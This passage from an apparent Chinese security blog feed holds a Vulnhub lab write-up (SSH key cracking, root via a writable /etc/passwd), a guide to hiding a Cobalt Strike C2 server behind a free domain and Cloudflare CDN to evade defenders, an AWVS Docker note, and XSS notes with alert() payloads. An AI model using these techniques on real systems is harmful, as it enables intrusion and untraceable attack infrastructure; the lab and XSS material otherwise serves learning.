src="https://res.cloudinary.com/lin1109/image/upload/v1630674706/8_dhbc1e.png"></p><p><strong>破解私钥密码</strong></p><p>这里使用一款工具 John</p><p>先将私钥转换成 hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py id_rsa &gt; rsacrack</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630727320/9_nooema.png"></p><p>使用 john 进行破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john rsacrack#得到私钥口令unicorn</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630727319/10_vjfybi.png"></p><p><strong>ssh 远程连接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.1.21 -i id_rsa</span><br></pre></td></tr></table></figure><p><strong>权限提升</strong></p><p>&#x2F;etc&#x2F;passwd 文件全部用户可读可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ ls -l /etc/passwd</span><br><span class="line">-rw-rw-rw- 1 root root 1398 Aug 16 13:20 /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash   #&quot;x&quot;表示示用户密码的哈希值存储在/etc/shadow文件中 删除X可以删除root的密码但是这里不行</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>我们生成一个密码替换 root 的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 toor  #密码为toor的哈希 $1$./wxeDKk$m0criiK.xH6aLYNVagRmS.</span><br></pre></td></tr></table></figure><p>编辑 &#x2F;etc&#x2F;passwd 文件</p><p>靶机 vim 有点问题 测试了一下存在 nano 用 nano 编辑 &#x2F;etc&#x2F;passwd 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/passwd#ctrl+O 保存退出</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630729367/12_jt2j3i.png"></p><p>切换 root 用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -l root  #输入我们替换的密码toor</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1630729365/13_umsviw.png"></p><p>至此整个靶机通关</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C2 隐匿</title>
      <link href="/posts/2101328318/"/>
      <url>/posts/2101328318/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>由于此前服务器一直是裸奔状态导致最近我的服务器被微步标记为了远控服务器，才意识到修改 CobaltStrike 特征、隐藏 ip、伪装流量，防止被蓝队溯源有多么迫在眉睫。</p></blockquote><h2 id="cdn-domain-隐藏-c2"><a href="#cdn-domain-隐藏-c2" class="headerlink" title="cdn+domain 隐藏 c2"></a>cdn+domain 隐藏 c2</h2><p><strong>Domain</strong></p><p>准备一个不需要备案的域名，防止被溯源，可以去 Freenom 免费注册一个 tk、ml、cf 等后缀域名、1 年之内免费使用</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629103626/1_ryiusx.png"></p><p><strong>CDN</strong></p><p>注册 cloudflare 我们使用它的免费 cdn</p><p>Freenom 域名注册完成后将它默认的 dns 服务器改成 cloudflare 的，后续在 cloudflare 上添加 A 记录进行解析</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629106008/2_uamzi3.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629106246/3_m8rion.png"></p><p><strong>解析</strong></p><p>在 cloudflare 上添加 A 类型记录，自定义二级域名指向 c2 服务器 ip</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629106943/4_qd7pk0.png"></p><p><strong>配置证书</strong></p><p>这一步可做可不做</p><p>修改 SSL&#x2F;TLS 加密模式为完全，在源服务器中创建证书，创建时私钥类型选择 ECC，并保存为.pem 和.key 文件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629107529/5_p71ufn.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629107647/6_qrgck3.png"></p><h2 id="Cobalt-Strike-设置"><a href="#Cobalt-Strike-设置" class="headerlink" title="Cobalt Strike 设置"></a>Cobalt Strike 设置</h2><p>先删除 cobalstrike 默认的 cobalstrike.store 文件</p><p>并使用如下命令重新生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in a.pem -inkey a.key -out a.p12 -name xxx.xxxx.xx -passout pass:123456</span><br><span class="line"># name为域名  pass为自设密码</span><br></pre></td></tr></table></figure><p>使用以下命令创建证书生成全新的 cobaltstrike.store 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cobaltstrike.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias xxx.xxxx.tk</span><br><span class="line"># 123456为上面pass的自设密码</span><br></pre></td></tr></table></figure><h3 id="Cobalt-Strike-profile-设置"><a href="#Cobalt-Strike-profile-设置" class="headerlink" title="Cobalt Strike profile 设置"></a>Cobalt Strike profile 设置</h3><p>可使用 C2concealer 项目动态生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FortyNorthSecurity/C2concealer</span><br></pre></td></tr></table></figure><p>或修改以下文件保存命名为.profile 后缀放到 Cobalt Strike 根目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;cobaltstrike.store&quot;;</span><br><span class="line">    set password &quot;123456&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    set uri_x86 &quot;/api/1&quot;;</span><br><span class="line">    set uri_x64 &quot;/api/2&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;xxx.xxxx.tk&quot;;&#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/api/3&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;xxx.xxxx.tk&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/4&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;xxx.xxxx.tk&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令检查 c2.profile 配置文件是否正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint name.profile</span><br></pre></td></tr></table></figure><p>启动 Cobalt Strike</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver host_ip password ./name.profile  #加载指定配置文件启动</span><br></pre></td></tr></table></figure><p>保持 Cobalt Strike 服务后台运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./teamserver host_ip password ./name.profile &amp;  </span><br></pre></td></tr></table></figure><h3 id="Cobalt-Strike-监听设置"><a href="#Cobalt-Strike-监听设置" class="headerlink" title="Cobalt Strike 监听设置"></a>Cobalt Strike 监听设置</h3><p>注意：cloudflare 免费版本只解析几个特定端口，除此之外其他端口是没有效果的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">80、8080、8880、2052、2082、2086、2095</span><br><span class="line">https:</span><br><span class="line">443、2053、2083、2087、2096、8443</span><br></pre></td></tr></table></figure><p><strong>HTTP</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629111812/7_lscu4k.png"></p><p><strong>HTTPS</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629111812/8_ylghc2.png"></p><p><strong>无落地 powershell 上线</strong></p><p><strong>HTTP</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629114872/8_xdqtzp.png"></p><p>成功上线，可以发现外部 ip 变为了 162.158.106.34 为 cloudflare 节点 ip</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629114879/9_exjn1a.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629115226/10_aj2tac.png"></p><p>同时目标机器的 tcp 连接 ip 也变成了 cloudflare 的节点，达到了隐藏 c2 真实 ip 的效果</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629115448/11_tloz5h.png"></p><p>这里可以用 wireshark 抓包分析验证 可以确定 ip 已经是 cloudflare 的节点 ip 了 这里不演示了</p><p><strong>HTTPS</strong></p><p>同样成功上线 达到隐藏 c2 真实 ip 效果</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629116417/12_gmgtvd.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629116291/13_rmjpjk.png"></p><p><strong>EXE 木马上线</strong></p><p>Cobalt Strike 生成普通 exe 木马丢入沙箱分析</p><p>能分析出域名、但是无法分析出 ip 地址、分析出的 ip 地址为 cdn 节点</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1629117100/14_fo81bb.png"></p><p>唯一缺点：不稳定、延迟较大。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWVS Docker 部署</title>
      <link href="/posts/4136486895/"/>
      <url>/posts/4136486895/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  pull 拉取下载镜像</span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">#  将Docker的3443端口映射到物理机的 13443端口</span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"># 容器的相关信息</span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br></pre></td></tr></table></figure><p>来源于国光大佬的博客</p><p>传送门：<a href="https://www.sqlsec.com/">https://www.sqlsec.com/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss 学习笔记</title>
      <link href="/posts/91140404/"/>
      <url>/posts/91140404/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="XSS-漏洞学习总结"><a href="#XSS-漏洞学习总结" class="headerlink" title="XSS 漏洞学习总结"></a>XSS 漏洞学习总结</h2><h3 id="xss-漏洞介绍"><a href="#xss-漏洞介绍" class="headerlink" title="xss 漏洞介绍"></a>xss 漏洞介绍</h3><p>XSS 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，OWASP Top 10 排名前三的漏洞、黑客可以通过特殊的手段在网页中插入恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 cookie 资料窃取、会话劫持、钓鱼欺骗等攻击。XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p><h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><p>形成 XSS 漏洞的主要原因是程序对输入和输出没有做合适的处理，导致 “精心构造” 的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在 XSS 漏洞的防范上，一般会采用 “对输入进行过滤” 和 “输出进行转义” 的方式进行处理</p><h3 id="xss-危害"><a href="#xss-危害" class="headerlink" title="xss 危害"></a>xss 危害</h3><p>1、网络钓鱼<br>2、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>3、劫持用户浏览器<br>4、强制弹出广告页面、刷流量、发送电子邮件<br>5、网页挂马等<br>6、进行恶意操作，例如任意篡改页面信息<br>7、获取客户端隐私信息、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>8、控制受害者机器向其他网站发起攻击<br>9、结合其他漏洞，如 CSRF 漏洞，进一步扩大危害<br>10、传播跨站脚本蠕虫等</p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>输入过滤：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义</p><h3 id="xss-跨站脚本实例"><a href="#xss-跨站脚本实例" class="headerlink" title="xss 跨站脚本实例"></a>xss 跨站脚本实例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上脚本浏览器执行即可弹窗</p><h3 id="xss-漏洞类型"><a href="#xss-漏洞类型" class="headerlink" title="xss 漏洞类型"></a>xss 漏洞类型</h3><h4 id="反射型-xss"><a href="#反射型-xss" class="headerlink" title="反射型 xss"></a>反射型 xss</h4><p>反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码。 反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637197434/Xnip2021-11-18_09-02-32_hel2cl.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637197434/Xnip2021-11-18_09-02-44_fi2kex.png"></p><p>反射性 xss 的特点是只有在用户浏览时才会触发，而且只会执行一次，不是持久化的，所以称为反射型 xss，反射型 xss 的危害要低于持久型 xss，因为反射型 xss 的恶意代码通常暴露在 URL 参数中，并且需要用户浏览点击才能触发，而且容易被用户发现。因此反射型 XSS 的攻击成本要比持久型 XSS 高得多，不过我们可以通过短网址或者二维码的形式来伪装 URL。诱导用户进行浏览访问，从而造成 xss 攻击</p><h4 id="储存型-xss"><a href="#储存型-xss" class="headerlink" title="储存型 xss"></a>储存型 xss</h4><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，网站程序没有对其进行编码过滤而直接输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><p>存储型 XSS 和反射型 XSS 的差别在于：提交的 XSS 代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交 XSS 代码。</p><p>这里会将恶意 js 代码插入到数据库进行储存</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637198265/Xnip2021-11-18_09-17-25_bs4ejx.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637198265/Xnip2021-11-18_09-17-33_qiet3p.png"></p><p>存储型 XSS 比较隐蔽，而且危害较大，存储型 XSS 从 URL 上看都是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有 XSS 代码，就当做正常的 HTML 与 JS 解析执行，于是就触发了 XSS 攻击。</p><h4 id="DOM-型-xss"><a href="#DOM-型-xss" class="headerlink" title="DOM 型 xss"></a>DOM 型 xss</h4><p>DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。</p><p>简单来说就是通过修改页面的 DOM 节点形成的 XSS，称之为 DOM XSS。它和反射型 XSS、存储型 XSS 的差别在于，DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，全部过程都在客户端发生，不需要服务器的参与。</p><p>以下是一些经常出现 dom xss 的关键语句</p><p>document.referer 属性</p><p>window.name 属性</p><p>location 属性</p><p>innerHTML 属性</p><p>documen.write 属性</p><p>DOM XSS 分析</p><p>这个按钮指向了一个事件，点击就会执行 domxss () 函数</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637198810/Xnip2021-11-18_09-26-20_g4eirf.png"></p><p>跟踪 domxss 函数，分析这个函数可以看出先获取了 id 为 text 的文本框中的值，然后将获取到的值插入了 id 为 dom 的 a 标签中，这里使用了 innerHTML 方法</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637198940/Xnip2021-11-18_09-28-43_wsok7w.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就存在 DOM XSS 漏洞，我们将前面的’进行闭合即可造成 xss 攻击</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(/xss/)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637200050/Xnip2021-11-18_09-47-11_hkacxp.png"></p><p>这里点击一下 what do you see 就会弹窗 sxx</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637200298/Xnip2021-11-18_09-51-26_xbnjix.png"></p><p>或者如下 payload</p><p>图片加载出错就执行 alert 函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot; </span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637200824/Xnip2021-11-18_09-59-09_bxyq5g.png"></p><p>当鼠标移动到图片上就执行 alert 函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(/xss/)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637200824/Xnip2021-11-18_10-00-11_jkip9b.png"></p><h3 id="xss-测试语句"><a href="#xss-测试语句" class="headerlink" title="xss 测试语句"></a>xss 测试语句</h3><p>在网站是否存在 xss 漏洞时，应该输入一些标签如 &lt;、&gt; 输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞。<br>常用的测试语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="number">1</span>&lt;/h1&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;<span class="number">1</span>&lt;/span&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>闭合语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&#x27;</span></span><br></pre></td></tr></table></figure><p>单行注释语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;span&gt;x&lt;/span&gt;//</span></span><br></pre></td></tr></table></figure><h3 id="xss-攻击语句"><a href="#xss-攻击语句" class="headerlink" title="xss 攻击语句"></a>xss 攻击语句</h3><p>输入检测确定标签没有过滤后，为了显示存在漏洞，需要插入 xss 攻击代码。</p><p>常用攻击语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight 